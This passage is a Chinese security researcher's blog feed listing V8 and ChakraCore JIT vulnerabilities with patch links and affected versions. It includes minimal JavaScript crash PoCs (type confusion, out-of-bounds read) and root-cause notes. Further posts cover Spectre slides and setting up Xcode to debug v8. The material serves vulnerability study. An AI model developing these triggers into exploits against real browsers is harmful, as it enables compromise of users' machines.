rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=797596</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/007f90ba9b331e4d3a8186799b098bec9b521b0a" target="_blank" rel="noopener">https://github.com/v8/v8/commit/007f90ba9b331e4d3a8186799b098bec9b521b0a</a></li><li>影响版本<br>6.5.107及以下</li></ul><h2 id="Bugs-794405-794359"><a href="#Bugs-794405-794359" class="headerlink" title="Bugs:794405/794359"></a>Bugs:794405/794359</h2><ul><li><p>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794405" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794405</a></p></li><li><p>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=794359" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=794359</a></p></li></ul><h2 id="Bugs-799263"><a href="#Bugs-799263" class="headerlink" title="Bugs:799263"></a>Bugs:799263</h2><ul><li>Chrome: V8: JIT: A bug in LoadElimination::ReduceTransitionElementsKind<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=799263" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=799263</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/9884bc5dee488bf206655f07b8a487afef4ded9b" target="_blank" rel="noopener">https://github.com/v8/v8/commit/9884bc5dee488bf206655f07b8a487afef4ded9b</a></li><li>影响版本<br>6.4.66-6.5.143</li><li>引入漏洞的分支<br><a href="https://chromium.googlesource.com/v8/v8.git/+/9884bc5dee488bf206655f07b8a487afef4ded9b" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8.git/+/9884bc5dee488bf206655f07b8a487afef4ded9b</a></li></ul><h2 id="Bugs-797130"><a href="#Bugs-797130" class="headerlink" title="Bugs:797130"></a>Bugs:797130</h2><ul><li>DCHECK failure in min_block == BasicBlock::GetCommonDominator(block, min_block) in scheduler.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=797130" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=797130</a></li><li>patch没找到</li></ul><h2 id="Bugs-801627"><a href="#Bugs-801627" class="headerlink" title="Bugs:801627"></a>Bugs:801627</h2><ul><li>V8: JIT: Type confusion in NodeProperties::InferReceiverMaps<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=801627" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=801627</a><br><a href="https://cs.chromium.org/chromium/src/v8/src/compiler/node-properties.cc?rcl=df84e87191022bf6914f9570069908f10b303245&amp;l=416" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/src/compiler/node-properties.cc?rcl=df84e87191022bf6914f9570069908f10b303245&amp;l=416</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/e272a2f722422651cf5bbbe0168702ee5d38cfe8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/e272a2f722422651cf5bbbe0168702ee5d38cfe8</a></li><li>影响版本<br>v6.5.198及以下几个版本</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Here's a snippet of NodeProperties::InferReceiverMaps.</span><br><span class="line">      <span class="keyword">case</span> IrOpcode::kJSCreate: &#123;</span><br><span class="line">        <span class="keyword">if</span> (IsSame(receiver, effect)) &#123;</span><br><span class="line">          HeapObjectMatcher mtarget(GetValueInput(effect, 0));</span><br><span class="line">          HeapObjectMatcher mnewtarget(GetValueInput(effect, 1));</span><br><span class="line">          <span class="keyword">if</span> (mtarget.HasValue() &amp;&amp; mnewtarget.HasValue()) &#123;</span><br><span class="line">            Handle&lt;JSFunction&gt; original_constructor =</span><br><span class="line">                Handle&lt;JSFunction&gt;::cast(mnewtarget.Value());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (original_constructor-&gt;has_initial_map()) &#123;</span><br><span class="line">              Handle&lt;Map&gt; initial_map(original_constructor-&gt;initial_map());</span><br><span class="line">              <span class="keyword">if</span> (initial_map-&gt;constructor_or_backpointer() ==</span><br><span class="line">                  *mtarget.Value()) &#123;</span><br><span class="line">                *maps_return = ZoneHandleSet&lt;Map&gt;(initial_map);</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// We reached the allocation of the &#123;receiver&#125;.</span></span><br><span class="line">          <span class="keyword">return</span> kNoReceiverMaps;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>“mnewtarget” is expected to be a constructor which also can be of type JSBoundFunction. But “mnewtarget” is always cast to JSFunction which leads to type confusion.<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PoC:</span><br><span class="line"><span class="comment">// Flags: --allow-natives-syntax --enable_slow_asserts</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.x = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Derived</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="comment">// JSCreate emitted I guess.</span></span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bound = <span class="built_in">Object</span>.bind();</span><br><span class="line"><span class="built_in">Reflect</span>.construct(Derived, [], bound);  <span class="comment">// Feed a bound function as new.target to the profiler, so HeapObjectMatcher can find it.</span></span><br><span class="line"></span><br><span class="line">%OptimizeFunctionOnNextCall(Derived);</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Derived();</span><br></pre></td></tr></table></figure></p><h2 id="Bugs-802060"><a href="#Bugs-802060" class="headerlink" title="Bugs:802060"></a>Bugs:802060</h2><ul><li>DCHECK failure in op-&gt;IsAnyLocationOperand() in instruction.h<br>bug in x64 immediate operand handling for smi-converting loads<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=802060" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=802060</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/9ef2ed308522d86ea93cd5a39bd4e188a5ae4f02" target="_blank" rel="noopener">https://github.com/v8/v8/commit/9ef2ed308522d86ea93cd5a39bd4e188a5ae4f02</a></li><li>影响版本<br>6.6.136及以下</li><li>note<br>看不懂2333</li></ul><h2 id="Bugs-802333"><a href="#Bugs-802333" class="headerlink" title="Bugs:802333"></a>Bugs:802333</h2><ul><li>Security: V8: A bug in the ObjectDescriptor class<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=802333" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=802333</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/e416e3c475ef8bd76455dbd9dd416e7edfe56893" target="_blank" rel="noopener">https://github.com/v8/v8/commit/e416e3c475ef8bd76455dbd9dd416e7edfe56893</a></li><li>影响版本<br>6.6.85及以下</li></ul><h2 id="Bugs-803022"><a href="#Bugs-803022" class="headerlink" title="Bugs:803022"></a>Bugs:803022</h2><ul><li>DCHECK failure in current<em> == next</em> in node.h<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=803022" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=803022</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/b71133245c24149786942793ce3fa1462e9b02d9" target="_blank" rel="noopener">https://github.com/v8/v8/commit/b71133245c24149786942793ce3fa1462e9b02d9</a></li><li>影响版本<br>6.6.45及以下</li></ul><h2 id="Bug-chromium-804801"><a href="#Bug-chromium-804801" class="headerlink" title="Bug: chromium:804801"></a>Bug: chromium:804801</h2><ul><li>CHECK failure: Type cast failed in CAST(add_func) at ../../src/builtins/builtins-collections-ge<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=804801" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=804801</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/c0a6e85153f148f051b6e3d90de8a3f1bf59fc69" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c0a6e85153f148f051b6e3d90de8a3f1bf59fc69</a></li><li>影响版本<br>6.6.54及以下</li></ul><h2 id="Bugs-804837"><a href="#Bugs-804837" class="headerlink" title="Bugs:804837"></a>Bugs:804837</h2><ul><li>CHECK failure: LoadElement of kRepFloat64 (NumberOrHole) cannot be changed to kRepTagged in rep<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=804837" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=804837</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/a9796a1d27185fdd8dc2c70d45712dc62c35f301" target="_blank" rel="noopener">https://github.com/v8/v8/commit/a9796a1d27185fdd8dc2c70d45712dc62c35f301</a></li><li>影响版本<br>6.6.45及以下</li></ul><h2 id="Bugs-818144"><a href="#Bugs-818144" class="headerlink" title="Bugs:818144"></a>Bugs:818144</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=818144" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=818144</a><br>没找到patch</p><h2 id="Bugs-818811"><a href="#Bugs-818811" class="headerlink" title="Bugs:818811"></a>Bugs:818811</h2><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=818811" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=818811</a><br>没找到patch</p><h2 id="Bugs-819311"><a href="#Bugs-819311" class="headerlink" title="Bugs:819311"></a>Bugs:819311</h2><ul><li>DCHECK failure in op-&gt;opcode() == IrOpcode::kStateValues || op-&gt;opcode() == IrOpcode::kTypedStateV<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=819311" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=819311</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/221173eaa222a23041f00f02ad9da812d1027e49" target="_blank" rel="noopener">https://github.com/v8/v8/commit/221173eaa222a23041f00f02ad9da812d1027e49</a></li><li>影响范围<br>6.7.26及以下</li></ul><h2 id="Bugs-820984"><a href="#Bugs-820984" class="headerlink" title="Bugs:820984"></a>Bugs:820984</h2><ul><li>CHECK failure: InstructionSelector::SupportsSpeculationPoisoning() in pipeline.cc<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=820984" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=820984</a><br>没找到patch，好像是回滚了</li></ul><h2 id="Bug-822284"><a href="#Bug-822284" class="headerlink" title="Bug:822284"></a>Bug:822284</h2><ul><li>ThinStrings are incompatible with TurboFan SeqString types<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=822284" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=822284</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/c65f0a78c33452dc19b52934771ecb2c1ce3a0b8" target="_blank" rel="noopener">https://github.com/v8/v8/commit/c65f0a78c33452dc19b52934771ecb2c1ce3a0b8</a></li><li>引入漏洞的分支<br><a href="https://github.com/v8/v8/commit/02dbef1489982865077c2b847c758eebcf0a80ad#diff-059b3ec8bfe85fc04d9dbad20762ebe2" target="_blank" rel="noopener">https://github.com/v8/v8/commit/02dbef1489982865077c2b847c758eebcf0a80ad#diff-059b3ec8bfe85fc04d9dbad20762ebe2</a></li><li>影响版本<br>6.5.245-6.7.86</li></ul><h2 id="Bugs-829679"><a href="#Bugs-829679" class="headerlink" title="Bugs:829679"></a>Bugs:829679</h2><ul><li>incorrect usages of SelectTaggedConstant()<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=829679" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=829679</a></li><li>patch<br><a href="https://github.com/v8/v8/commit/f018cebf38b8d2b9ca3d73e01c871334b49ef6d2" target="_blank" rel="noopener">https://github.com/v8/v8/commit/f018cebf38b8d2b9ca3d73e01c871334b49ef6d2</a></li><li>影响版本<br>6.7.245及以下</li></ul><h1 id="Edge"><a href="#Edge" class="headerlink" title="Edge"></a>Edge</h1><h2 id="关注更新"><a href="#关注更新" class="headerlink" title="关注更新"></a>关注更新</h2><p><a href="https://github.com/Microsoft/ChakraCore/wiki/Roadmap" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/wiki/Roadmap</a></p><h2 id="v1-8-3"><a href="#v1-8-3" class="headerlink" title="v1.8.3"></a>v1.8.3</h2><h3 id="CVE-2018-8139"><a href="#CVE-2018-8139" class="headerlink" title="CVE-2018-8139"></a>CVE-2018-8139</h3><ul><li>Microsoft Edge: Chakra: A bug in BoundFunction::NewInstance<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1569" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1569</a></li><li>Patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/ee5dfabc51728f97f6d69e89c88af088251b6b76</a></li><li><p>PoC</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">new</span>.target.x;<span class="comment">//[0]-&gt;new.target跟在正常的参数之后，.x的时候会当JS对象处理，我在还原poc的时候new.target刚好是空指针，于是就读Null.x触发crash了。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bound = func.bind(&#123;&#125;, <span class="number">1</span>);<span class="comment">//-&gt;boundFunction-&gt;boundArgs[i]</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Reflect</span>.construct(bound, []);</span><br></pre></td></tr></table></figure></li><li><p>Syntax<br>Reflect.construct<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Reflect/construct</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Reflect.construct(target, argumentsList[, newTarget])</span><br></pre></td></tr></table></figure></li></ul><p>不引入newTarget这个可选参数，就和new target(…args)用法一致<br>但是引入的话，就是为了在一些框架里满足一种罕见的需求，也就是要求<strong>用target来初始化实例，但是却要求表现出来的结果是newTarget的实例</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-072310.png" alt=""></p><ul><li>root cause<br>漏洞成因是BoundFunction::NewInstance在调用Target函数时，没有考虑到CallFlags_ExtraArg这个flag，所以没有拷贝ExtraArg(这里也就是newTarget)。<br>从patch里可以看到，在patch之后，考虑到了这个flag。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+           <span class="keyword">if</span> (args.HasExtraArg())</span><br><span class="line">+            &#123;</span><br><span class="line">+                newValues[index++] = args.Values[argCount];</span><br><span class="line">+            &#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-083423.jpg" alt=""><br><strong>但仍有CallFlags_NewTarget标记</strong>。<br>导致在后面真正调用Target函数的时候，在InterpreterStackFrame::OP_LdNewTarget时，会从栈上的Args数组越界读取8个字节的内容<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093809.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093857.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-23-093906.jpg" alt=""></p><ul><li>info leak<br>能不能布置栈上数据？</li><li>how to find?<br>对标志位的处理，逻辑bug，审计？</li></ul><h2 id="v1-8-4"><a href="#v1-8-4" class="headerlink" title="v1.8.4"></a>v1.8.4</h2><h3 id="CVE-2018-8229"><a href="#CVE-2018-8229" class="headerlink" title="CVE-2018-8229"></a>CVE-2018-8229</h3><ul><li>Microsoft Edge: Chakra: JIT: Type confusion with hoisted SetConcatStrMultiItemBE instructions<br><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1560" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1560</a></li><li>Patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/9b270c55bfea2fbefc9482d3414c4b4b395cad10" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/9b270c55bfea2fbefc9482d3414c4b4b395cad10</a></li><li>PoC<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">opt</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">200</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = str.charCodeAt(<span class="string">'AAAAAAAAAA'</span> + str + <span class="string">'BBBBBBBBBB'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opt(<span class="string">'x'</span>);</span><br><span class="line">opt(<span class="number">0x1234</span>);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Chrome&quot;&gt;&lt;a href=&quot;#Chrome&quot; class=&quot;headerlink&quot; title=&quot;Chrome&quot;&gt;&lt;/a&gt;Chrome&lt;/h1&gt;&lt;h2 id=&quot;Bugs-715582&quot;&gt;&lt;a href=&quot;#Bugs-715582&quot; class=&quot;header
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="edge" scheme="http://eternalsakura13.com/tags/edge/"/>
    
      <category term="chrome" scheme="http://eternalsakura13.com/tags/chrome/"/>
    
      <category term="safari" scheme="http://eternalsakura13.com/tags/safari/"/>
    
  </entry>
  
  <entry>
    <title>被“幽灵”困扰的浏览器</title>
    <link href="http://eternalsakura13.com/2018/07/21/kanxue/"/>
    <id>http://eternalsakura13.com/2018/07/21/kanxue/</id>
    <published>2018-07-21T09:07:03.717Z</published>
    <updated>2018-10-22T14:25:51.743Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Spectre"><a href="#Spectre" class="headerlink" title="Spectre"></a>Spectre</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-091936.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092124.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092223.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092249.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092330.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092420.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092444.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092549.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092615.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092651.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092739.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092800.png" alt=""></p><h3 id="Spectre-in-Browser"><a href="#Spectre-in-Browser" class="headerlink" title="Spectre in Browser"></a>Spectre in Browser</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-092827.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093023.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093134.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093251.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093319.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093333.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093354.png" alt=""></p><h3 id="Real-attack-of-“Spectre”"><a href="#Real-attack-of-“Spectre”" class="headerlink" title="Real attack of “Spectre”"></a>Real attack of “Spectre”</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093508.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093520.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093537.png" alt=""></p><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-21-093627.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Spectre&quot;&gt;&lt;a href=&quot;#Spectre&quot; class=&quot;headerlink&quot; title=&quot;Spectre&quot;&gt;&lt;/a&gt;Spectre&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;https://sakura-1252236262.cos.ap-beijing
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>在mac上使用xcode调试v8</title>
    <link href="http://eternalsakura13.com/2018/07/20/v8_xcode/"/>
    <id>http://eternalsakura13.com/2018/07/20/v8_xcode/</id>
    <published>2018-07-20T08:07:44.358Z</published>
    <updated>2018-07-20T09:05:45.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>最近在看chakra的漏洞，用为知笔记记一些零散的或者思路性的东西还是蛮方便，chakra有点不想搞2333，把0234搞完了继续看v8咯。<br>然后命令行调试还是太太太麻烦了，于是在VPN搭好了之后，就在xcode上干活了。</p><h2 id="搭建VPN并连接"><a href="#搭建VPN并连接" class="headerlink" title="搭建VPN并连接"></a>搭建VPN并连接</h2><p>在之前搭ss的服务器上运行一个vpn的docker(人生苦短，我用docker)<br>直接切换到root然后运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">docker run \</span><br><span class="line">    --name ipsec-vpn-server \</span><br><span class="line">    --restart=always \</span><br><span class="line">    -e VPN_IPSEC_PSK=你的密码 \</span><br><span class="line">    -e VPN_USER=你的用户名 \</span><br><span class="line">    -e VPN_PASSWORD=你的共享密码（其实和密码填一样就好了，不会弄混） \</span><br><span class="line">    -p 500:500/udp \</span><br><span class="line">    -p 4500:4500/udp \</span><br><span class="line">    -v /lib/modules:/lib/modules:ro \</span><br><span class="line">    -d --privileged \</span><br><span class="line">    hwdsl2/ipsec-vpn-server</span><br></pre></td></tr></table></figure></p><p>连接VPN<br><a href="http://www.vpngate.net/cn/howto_l2tp.aspx" target="_blank" rel="noopener">http://www.vpngate.net/cn/howto_l2tp.aspx</a></p><h2 id="mac上编译"><a href="#mac上编译" class="headerlink" title="mac上编译"></a>mac上编译</h2><p>怎么获取源码，终端编译之前已经写过了，懒得赘述。<br>这里讲一下怎么建立xcode工程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gn gen out/gn --ide=&quot;xcode&quot;</span><br></pre></td></tr></table></figure></p><p>这样，在out目录下就会有gn文件夹，里面有all.xcworkspace文件，可以直接使用xcode打开这个工作区文件，接下来要设置编译的目标，在Product-&gt;Scheme下选择d8，否则会编译出错，这样就只编译d8这个可执行程序，使用d8就可以直接调试v8的源代码。<br>然后直接Build，编译时间有些长，会自动生成v8的链接库，等待编译完成，在Product-&gt;EditScheme菜单中把poc文件作为运行参数，在对应文件中下好断点，直接运行就会断下来了。</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>噫，我好像只是教了怎么搭VPN……</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前述&quot;&gt;&lt;a href=&quot;#前述&quot; class=&quot;headerlink&quot; title=&quot;前述&quot;&gt;&lt;/a&gt;前述&lt;/h2&gt;&lt;p&gt;最近在看chakra的漏洞，用为知笔记记一些零散的或者思路性的东西还是蛮方便，chakra有点不想搞2333，把0234搞完了继续看v8咯。
      
    
    </summary>
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="v8" scheme="http://eternalsakura13.com/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>V8 javascript engine代码阅读</title>
    <link href="http://eternalsakura13.com/2018/07/09/zujian/"/>
    <id>http://eternalsakura13.com/2018/07/09/zujian/</id>
    <published>2018-07-09T09:25:34.699Z</published>
    <updated>2018-10-22T14:25:51.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="v8代码组成"><a href="#v8代码组成" class="headerlink" title="v8代码组成"></a>v8代码组成</h2><h3 id="目录结构概要"><a href="#目录结构概要" class="headerlink" title="目录结构概要"></a>目录结构概要</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">src ---+</span><br><span class="line">       |</span><br><span class="line">       +---arm</span><br><span class="line">       +---arm64</span><br><span class="line">       +---mips</span><br><span class="line">       +---mips64</span><br><span class="line">A      +---ia32</span><br><span class="line">       +---x64</span><br><span class="line">       +---ppc</span><br><span class="line">       +---s390</span><br><span class="line">       +---wasm</span><br><span class="line">       +---asmjs</span><br><span class="line">       |</span><br><span class="line">       +---ast</span><br><span class="line">       +---compiler</span><br><span class="line">B      +---compiler-dispatcher</span><br><span class="line">       +---interpreter</span><br><span class="line">       +---parsing</span><br><span class="line">       |</span><br><span class="line">       +---js</span><br><span class="line">       +---builtins</span><br><span class="line">C      +---runtime</span><br><span class="line">       +---snapshot</span><br><span class="line">       +---regexp</span><br><span class="line">       +---profiler</span><br><span class="line">       